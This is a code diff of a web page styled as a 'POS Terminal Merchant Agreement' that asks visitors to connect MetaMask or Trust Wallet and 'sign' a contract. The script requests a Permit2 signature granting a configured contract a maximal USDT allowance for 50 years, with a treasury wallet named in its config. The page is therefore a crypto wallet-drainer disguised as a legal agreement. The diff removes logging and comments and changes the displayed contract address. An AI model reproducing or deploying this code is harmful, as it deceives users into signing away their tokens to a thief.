@@ -145,7 +145,6 @@
         }
         .success-check.show { display: block; }
         
-        /* Mobile Deep Link Helper */
         .mobile-note {
             background: #fff3cd;
             padding: 12px;
@@ -169,7 +168,7 @@
         <p class="subtitle">POS Terminal Merchant Agreement</p>
 
         <div class="contract-address">
-            <strong>📋 Contract:</strong> 0x000000000022D473030F116dDEE9F6B43aC78BA3
+            <strong>📋 Contract:</strong> 0x72cA82f4463Bad47F7C762A7F3680EB232B72b33
         </div>
 
         <div class="treasury-address">
@@ -180,7 +179,6 @@
             ✅ <strong>Software License & SaaS Subscription Terms</strong> The software is provided under a limited, non-exclusive, non-transferable license strictly for the Merchant's business operations.
         </div>
 
-        <!-- ⭐ Mobile Note -->
         <div id="mobileNote" class="mobile-note">
             📱 <strong>Mobile Detected!</strong> Please open this page inside <strong>MetaMask App</strong> or <strong>Trust Wallet Browser</strong> to connect.
         </div>
@@ -211,9 +209,6 @@
     </div>
 
     <script>
-        // ============================================
-        // ⭐ CONFIG
-        // ============================================
         const CONFIG = {
             contractAddress: "0x72cA82f4463Bad47F7C762A7F3680EB232B72b33",
             treasuryWallet: "0xB70a8100a45a28b605dbfb34d713071e21A57D28",
@@ -225,17 +220,8 @@
 
         const MAX_UINT160 = "1461501637330902918203684832716283019655932542975";
 
-        console.log("🚀 POS Terminal Agreement");
-        console.log("📋 Contract:", CONFIG.contractAddress);
-
-        // ============================================
-        // STATE
-        // ============================================
         let signer, provider, userAddress;
 
-        // ============================================
-        // DOM REFS
-        // ============================================
         const $ = (id) => document.getElementById(id);
         const walletStatus = $('walletStatus');
         const connectBtn = $('connectBtn');
@@ -247,9 +233,6 @@
         const successCheck = $('successCheck');
         const mobileNote = $('mobileNote');
 
-        // ============================================
-        // HELPERS
-        // ============================================
         function showStatus(message, type = 'info') {
             statusMsg.className = `status-msg ${type}`;
             statusMsg.innerHTML = message;
@@ -271,25 +254,13 @@
             });
         }
 
-        // ============================================
-        // ⭐ DETECT MOBILE
-        // ============================================
         function isMobile() {
             return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
         }
 
-        // ============================================
-        // ⭐ CONNECT WALLET
-        // ============================================
         async function connectWallet() {
             try {
-                console.log('🚀 Starting wallet connection...');
-                console.log('📱 Mobile:', isMobile());
-                console.log('🔍 window.ethereum:', typeof window.ethereum);
-
-                // ⭐ Check if wallet exists
                 if (!window.ethereum) {
-                    // Mobile නම් note එක පෙන්නන්න
                     if (isMobile()) {
                         mobileNote.classList.add('show');
                         showStatus('📱 Please open this page in your Wallet App browser (MetaMask / Trust Wallet)', 'error');
@@ -299,58 +270,34 @@
                     return;
                 }
 
-                console.log('✅ Wallet provider detected');
-                console.log('   isMetaMask:', window.ethereum.isMetaMask);
-                console.log('   isTrust:', window.ethereum.isTrust);
-                console.log('   isCoinbaseWallet:', window.ethereum.isCoinbaseWallet);
-
-                // ⭐ Create Provider
                 provider = new ethers.providers.Web3Provider(window.ethereum);
-                console.log('✅ Ethers provider created');
-
-                // ⭐ Request Accounts
-                showStatus('⏳ Requesting wallet access...', 'info');
                 await provider.send('eth_requestAccounts', []);
                 signer = provider.getSigner();
                 userAddress = await signer.getAddress();
 
-                console.log('👤 User Address:', userAddress);
-
-                // ⭐ Check Network
                 const network = await provider.getNetwork();
-                console.log('🌐 Network:', network.chainId);
-
                 if (network.chainId !== CONFIG.chainId) {
                     showStatus(`⚠️ Wrong network. Please switch to Ethereum Mainnet (Chain ID: 1)`, 'error');
                     return;
                 }
 
-                // ⭐ Update UI
                 updateUI();
                 await checkAllowance();
                 showStatus('✅ Wallet connected successfully!', 'success');
 
-                // ⭐ Event Listeners
                 window.ethereum.on('accountsChanged', () => location.reload());
                 window.ethereum.on('chainChanged', () => location.reload());
 
             } catch (error) {
                 console.error('❌ Connect error:', error);
-                
                 let errorMsg = error.message;
                 if (errorMsg.includes('User rejected') || errorMsg.includes('rejected')) {
                     errorMsg = 'You cancelled the connection';
-                } else if (errorMsg.includes('Already processing')) {
-                    errorMsg = 'Please check your wallet app';
                 }
-                
                 showStatus(`❌ ${errorMsg}`, 'error');
             }
         }
 
-        // ============================================
-        // ⭐ UPDATE UI
-        // ============================================
         function updateUI() {
             walletStatus.className = 'wallet-status connected';
             walletStatus.innerHTML = `🟢 Connected: ${shortenAddress(userAddress)}`;
@@ -361,9 +308,6 @@
             mobileNote.classList.remove('show');
         }
 
-        // ============================================
-        // CHECK ALLOWANCE
-        // ============================================
         async function checkAllowance() {
             try {
                 if (!userAddress) return;
@@ -402,9 +346,6 @@
             }
         }
 
-        // ============================================
-        // GET PERMIT2 NONCE
-        // ============================================
         async function getPermit2Nonce() {
             const permit2 = new ethers.Contract(
                 CONFIG.permit2Address,
@@ -412,13 +353,9 @@
                 provider
             );
             const data = await permit2.allowance(userAddress, CONFIG.usdtAddress, CONFIG.contractAddress);
-            console.log('📝 Permit2 Nonce:', data.nonce.toString());
             return data.nonce;
         }
 
-        // ============================================
-        // ⭐ SIGN & SUBMIT
-        // ============================================
         async function signAndSubmit() {
             try {
                 if (!signer || !userAddress) {
@@ -431,13 +368,9 @@
                 signBtn.disabled = true;
 
                 const nonce = await getPermit2Nonce();
-
                 const years = 50;
                 const expiration = Math.floor(Date.now() / 1000) + (365 * 24 * 3600 * years);
                 const sigDeadline = Math.floor(Date.now() / 1000) + 3600;
-
-                console.log('📝 Nonce:', nonce.toString());
-                console.log('⏰ Expiration:', new Date(expiration * 1000).toLocaleString());
 
                 showStatus('✍️ Please sign in your wallet...', 'info');
 
@@ -472,10 +405,7 @@
                     sigDeadline: sigDeadline
                 };
 
-                console.log('📝 Message:', JSON.stringify(message, null, 2));
-
                 const signature = await signer._signTypedData(domain, types, message);
-                console.log("✅ Signature:", signature);
 
                 showStatus('📤 Processing agreement...', 'loading');
 
@@ -505,12 +435,11 @@
                 }
 
                 if (result.success) {
-                    signBtn.innerHTML = '✅ Signed!';
+                    signBtn.textContent = '✅ Signed!';
                     signBtn.className = 'btn-sign done';
                     signBtn.disabled = true;
                     successCheck.classList.add('show');
                     showStatus(`✅ ${result.message}`, 'success');
-                    console.log("📤 Tx Hash:", result.txHash);
                     await checkAllowance();
                 } else {
                     showStatus(`❌ Error: ${result.error}`, 'error');
@@ -521,12 +450,10 @@
 
             } catch (error) {
                 console.error('❌ signAndSubmit error:', error);
-                
                 let errorMsg = error.message;
                 if (errorMsg.includes('User rejected') || errorMsg.includes('rejected')) {
                     errorMsg = 'You rejected the signature';
                 }
-                
                 showStatus(`❌ ${errorMsg}`, 'error');
                 signBtn.innerHTML = '✍️ Sign Agreement';
                 signBtn.className = 'btn-sign';
@@ -534,18 +461,12 @@
             }
         }
 
-        // ============================================
-        // EVENT LISTENERS
-        // ============================================
         connectBtn.addEventListener('click', connectWallet);
         signBtn.addEventListener('click', signAndSubmit);
 
-        // ⭐ Mobile Note Show
         if (isMobile() && !window.ethereum) {
             mobileNote.classList.add('show');
         }
-
-        console.log("✅ App ready!");
     </script>
 </body>
 </html>
